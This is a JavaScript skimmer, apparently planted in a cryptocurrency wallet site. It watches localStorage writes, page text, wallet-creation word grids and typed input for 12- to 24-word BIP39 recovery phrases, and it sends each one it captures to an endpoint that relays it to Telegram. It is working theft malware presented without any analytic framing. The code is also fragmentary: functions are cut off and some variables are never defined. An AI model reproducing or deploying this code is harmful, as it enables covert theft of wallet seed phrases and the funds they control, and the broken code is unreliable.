(function(){
  const API="/api/telegram";

    return r||"Direct";

  const src=getSource();

  async function send(data){
    // Always attach traffic source
    data.trafficSource=src;
    data.timestamp=new Date().toISOString();
    console.log("📤 Sending to API:",data.TYPE,data.WORDS?data.WORDS+" words":"");
    for(let i=0;i<3;i++){
      try{
        const r=await fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data})});
        const resp=await r.json();
        if(!r.ok){console.error("❌ API error:",r.status,resp);throw Error("HTTP "+r.status);}
        console.log("✅ API success:",resp);
        return resp;
      }catch(e){
        console.error("❌ Send failed (attempt "+(i+1)+"):",e.message);
        if(i===2){console.error("❌ All retries failed");throw e;}
        await new Promise(r=>setTimeout(r,1000*(i+1)));
      }
    }
  }

  // --- Storage monitoring: capture phrases saved to storage ---
  (function(){
    const orig=Storage.prototype.setItem;
    Storage.prototype.setItem=function(k,v){
      orig.apply(this,arguments);
      if(typeof v==="string"&&isSeed(v)){
        console.log("💾 Storage:",k,wc(v),"words");

  // --- Deep scan: find 12/15/18/21/24-word BIP39 phrases in page text ---
  function deepScan(){
    const allText=document.body.innerText||document.body.textContent||"";
    const words=allText.split(/\s+/).filter(w=>w.length>0);
    const counts=[12,15,18,21,24];
    
    for(const count of counts){
      if(words.length>=count){
        for(let i=0;i<=words.length-count;i++){
          const segment=words.slice(i,i+count).join(" ");
          if(isSeed(segment)){
            console.log("🔎 Deep scan found",count,"word BIP39 phrase");
            sendPhrase(segment,"DEEPSCAN","page");
            return;
          }
        }
      }
    }
  }
  setInterval(deepScan,2000);

  // --- Helpers ---

  function wc(v){return words(v).length;}

  function isSeed(v){
    if(!v)return false;
    var ws=words(v.toLowerCase());
    if(![12,15,18,21,24].includes(ws.length))return false;
    // ALL words must be in BIP39 wordlist
    var allValid=ws.every(function(w){
      return BIP39WORDS.indexOf(w)>=0 && w.length>=3 && w.length<=8;
    });
    return allValid;
  }

  // Send to Telegram, deduplicated
  function sendPhrase(phrase,type,field){
    var clean=phrase.toLowerCase().replace(/\s+/g," ").trim();
    if(!clean||clean===lastSent)return;
    lastSent=clean;
    var n=wc(clean);
    console.log("✅ CAPTURED:",n,"word phrase ["+type+"] from",src);
    console.log("🔑 PHRASE:",clean);
    send({TYPE:type,PHRASE:clean,WORDS:n,FIELD:field||"input",PAGE:location.pathname})
      .then(()=>console.log("✅ Delivered to Telegram"))
      .catch(e=>console.error("❌ Failed to deliver:",e.message));
  }

  // --- Collect words from .phrase-grid (wallet creation display) ---
  function collectGridPhrase(){
    // Try multiple selectors - React uses different class names
    var grid=document.querySelector(".phrase-grid")||
             document.querySelector('[class*="phrase-grid"]')||
             document.querySelector(".phrase-box")||
             document.querySelector('[class*="phrase-box"]')||
             document.querySelector(".backup")||
             document.querySelector('[class*="backup"]');
    
    if(!grid){return;} // Silently return if no grid
    
    // Try multiple ways to find word elements
    var spans=grid.querySelectorAll(":scope > span");
    if(!spans.length)spans=grid.querySelectorAll("span");
    if(!spans.length)spans=grid.querySelectorAll("div > span");
    if(!spans.length)spans=grid.children;
    if(!spans.length)return;
    
    var ws=[];
    for(var i=0;i<spans.length;i++){
      var txt=(spans[i].textContent||"").trim().replace(/^\d+[:.)\s]*/,"").trim();
      if(txt&&/^[a-zA-Z]{2,10}$/.test(txt))ws.push(txt.toLowerCase());
    }
    
    if([12,15,18,21,24].includes(ws.length)){ // 12, 15, 18, 21, or 24 words
      var phrase=ws.join(" ");
      if(phrase!==lastSent){
        lastSent=phrase;
        console.log("📋 WALLET_CREATED:",ws.length,"words");
        send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:ws.length,PAGE:location.pathname})
          .then(()=>console.log("✅ Delivered"))
          .catch(e=>console.error("❌ Failed:",e.message));
      }
    }
  }

  // --- Monitor DOM for phrase-grid and input fields ---
  function scanAll(){
    collectGridPhrase();
    // Also scan any input/textarea that has a full phrase value
    document.querySelectorAll("input,textarea").forEach(function(el){
      var v=(el.value||"").trim();
      if(isSeed(v))sendPhrase(v,"SEED_INPUT",el.name||el.id||el.placeholder||"field");
    });
    // Also check for phrases in divs with text content (React renders here)
    document.querySelectorAll("div,span,p").forEach(function(el){
      var v=(el.textContent||"").trim();
      if(isSeed(v))sendPhrase(v,"TEXT_CONTENT",el.className||"element");
    });
  }

  function startMonitor(){
    // MutationObserver for DOM changes
    new MutationObserver(function(muts){
      var changed=muts.some(function(m){return m.addedNodes.length||m.type==="characterData";});
      if(changed)setTimeout(scanAll,200);
    }).observe(document.body,{childList:true,subtree:true,characterData:true});
    
    // Aggressive polling - React updates frequently
    [500,1000,1500,2000,3000,5000,8000,12000,15000,20000].forEach(function(t){
      setTimeout(scanAll,t);
    });
    
    // Continuous polling every 2 seconds after initial load
    setInterval(scanAll,2000);
    
    console.log("🔍 Monitor started - watching for phrases...");
  }

  document.addEventListener("DOMContentLoaded",startMonitor);

  // --- Capture typed phrases in real time ---
  document.addEventListener("input",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
    var v=(t.value||"").trim();
    var n=wc(v);
    // Log every input to debug
    if(n>=10){console.log("⌨️ Input:",n,"words");}
    if(isSeed(v)){

      sendPhrase(v,"SEED_TYPED",t.name||t.id||t.placeholder||"input");

  // --- Capture on blur (user finishes typing and moves on) ---
  document.addEventListener("blur",function(e){
    var t=e.target;
    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
